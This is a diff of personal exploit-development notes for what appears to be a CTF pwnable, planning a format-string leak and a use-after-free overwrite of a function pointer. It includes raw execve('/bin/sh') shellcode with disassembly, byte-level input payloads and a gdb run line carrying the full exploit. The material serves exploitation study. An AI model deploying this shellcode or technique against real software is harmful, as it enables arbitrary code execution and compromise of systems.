@@ -8,7 +8,7 @@ regs, disasm, code, ghidra, stack, backtrace, expressions, threads, heap_tracker
 fgets does NOT terminate on null
 
 buf at      0x6032a0 -> buf[16] at      0x6032b0    x/16x 0x6032a0
-e3buf at    0x6042e0 -> e3buf[16] at    0x6042f0    x/6i 0x6042f0
+e3buf at    0x6042e0 -> e3buf[16] at    0x6042f0    x/6i 0x6042f0   ||  strace: e3buf @ 0x2b12a6e0
 id at       0x6020a0
 name at     0x7fffffffea00
 
@@ -18,26 +18,25 @@ the program allocates a 40 byte 'buf':
         the name is ALSO stored on the stack!!!
     the next 8 are a pointer to the function greetings(), which is called at the start of echo2() and echo3()
     the last 8 are a pointer to the function byebye(), which is called at the end of echo2() and echo3()
-EXP1: exiting the program through the (4) menu frees 'buf', EVEN if the user cancels the exit request
-EXP2: menu (2) -- FSB echo, echo2() -- asks for a string s (up to 32 chars, stored on the stack) and calls printf(s)
-    so we can give it "%[n]$p" to print the address of the nth argument
-        POSIX specifies that errno is set on error. It also specifies additional conversion specifications, most notably support for argument reordering (n$ immediately after % indicates nth argument). https://en.cppreference.com/w/c/io/fprintf
-    x64 SYSV: first 6 args are in registers RDI-RSI-RDX-RCX-R8-R9, then following from stack esp | esp-0x8 | esp - 0xa...
-    in echo2(), at time of get_input->printf(), the 10th argument (4th item on stack) contains rbp: top of main()'s stack
-    subtracting by 0x20 then yields &name
 echo3 mallocs 32 bytes of memory for the user to input something, echoes it back, then frees it
     freeing it modifies the first 16 bytes, but leaves the last 16 intact -- so we can control the contents of e3buf[16:]
-    if the 'buf' is freed through EXP1, then echo3's malloc will return a pointer to 'buf' -- so we can control the contents of buf[16:]
-        importantly, this includes buf[24:], which nominally contains a pointer to greetings()
-
-https://axcheron.github.io/exploit-101-format-strings/
+        however, it's not easy to keep a persistent handle on the address of this buffer, so this is of limited use
+    if the 'buf' is freed through EXP1, 
+EXP1: exiting the program through the (4) menu frees 'buf', EVEN if the user cancels the exit request
+    on the next call to echo3(), echo3's malloc will return a pointer to 'buf' -- so we can control the contents of buf[16:]
+        importantly, this includes buf[24:], which is supposed to contain &greetings(). we can overwrite this
+EXP2: echo2() asks for a string s (up to 32 chars, stored on the stack) and calls printf(s) -- https://axcheron.github.io/exploit-101-format-strings/
+    so we can give it "%[n]$p" to print the address of the nth argument: POSIX... specifies additional conversion specifications, most notably support for argument reordering (n$ immediately after % indicates nth argument). https://en.cppreference.com/w/c/io/fprintf
+    x64 SYSV: first 6 args are in registers RDI-RSI-RDX-RCX-R8-R9, then following from stack esp | esp-0x8 | esp - 0xa...
+    in echo2(), at time of get_input->printf(), the 10th "argument" (4th item on stack) contains rbp: top of main()'s stack
+    subtracting by 0x20 then yields &name
 
 so:
-    1. start program and install shellcode into 'name'
-    2. call echo3 and install "/usr/bin/sh" at e3buf[16]
+    1. start program and install shellcode into 'name'          x/5i $rbp-0x20
+*   2. call echo3 and install "/usr/bin/sh" at e3buf[16]        x/8x 0x6042e0   -- obsolete, since we can't maintain address of e3buf
     3. do EXP2 to leak address of &name
     4. do EXP1 to free 'buf'
-    5. call echo3 and install &name at buf[24]
+    5. call echo3 and install &name at buf[24]                  x/8x 0x6032a0
     6. call echo2() or echo3()
 
 \xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\n
@@ -47,17 +46,27 @@ so:
 3\nAAAABBBBCCCCDDDDEEEEFFFF[&name]
 2\n
 
-shellcode (18 bytes):  \xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05
+\x6a\x3b\x58\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x48\x31\xd2\x0f\x05
+shellcode 2 (21 bytes) -- directly embeds "/bin/sh", zeroes "envp" arg, does not zero "argv" arg (happens to be null already). (3 bytes to spare, could probably do it anyway)
+    6a 3b                   push   0x3b                     ; 
+    58                      pop    rax                      ; put 0x3b into rax, for execve()
+    48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f     ; put "/bin/sh" into rbx
+    73 68 00                                                ; 
+    53                      push   rbx                      ; push rbx to stack
+    54                      push   rsp                      ; push rsp to stack
+    5f                      pop    rdi                      ; pop rsp into rdi: effectively, puts the address of the "/bin/sh" string that we placed on the stack, into rdi (filename arg)
+    48 31 d2                xor    rdx,rdx                  ; zero rdx register (envp arg)
+    0f 05                   syscall                         ; 
+
+
+shellcode 1 (18 bytes) -- relies on having "/usr/bin/sh" stored elsewhere (e.g. e3buf, but hard to nail down &e3buf outside of debug):  \xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05
     b8 3b 00 00 00  mov    eax,0x3b     ; execve()
     bf f0 42 60 00  mov    edi,0x6042f0 ; arg0 (filename) -- stored at e3buf[16]
     48 31 f6        xor    rsi,rsi      ; arg1 (argv)
     48 31 d2        xor    rdx,rdx      ; arg2 (envp)
     0f 05           syscall             ; 
 
-
-
-
------------------- no: free() overwrites the first 16 bytes
+------------------ failed attempt: learned that free() overwrites the first 16 bytes of the freed block. also would not work because of page permissions.
 go through prompts to set up exploit| NAME\n4\nn\n3\n
 (13) store /usr/bin/sh at buf[0]    | /usr/bin/sh\x00\x00
 (17) store shellcode at buf[13]     | \xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05
@@ -65,7 +74,6 @@ go through prompts to set up exploit| NAME\n4\nn\n3\n
 store &buf[13] at buf[32]           | \xa0\x32\x60\x00\x00\x00\x00\x00
 
 run <<< $(printf "NAME\n4\nn\n3\n/usr/bin/sh\x00\x00\xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05\x00\x00\xa0\x32\x60\x00\x00\x00\x00\x00")
-
 
 shellcode: 17 bytes
     mov     rdi, 0x6032a0       ; arg0 (filename) -- stored in buf[0]
